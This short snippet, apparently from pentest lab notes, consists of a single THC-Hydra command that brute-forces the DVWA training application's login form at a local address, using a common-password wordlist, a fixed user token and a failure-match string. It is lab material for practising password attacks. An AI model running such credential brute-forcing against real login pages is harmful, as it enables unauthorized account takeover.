### THC-Hydra



```
hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt 192.168.1.106 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=6984e51d6b542c558d99bd109585a3d5:F=Username and/or password incorrect" -t 1
```
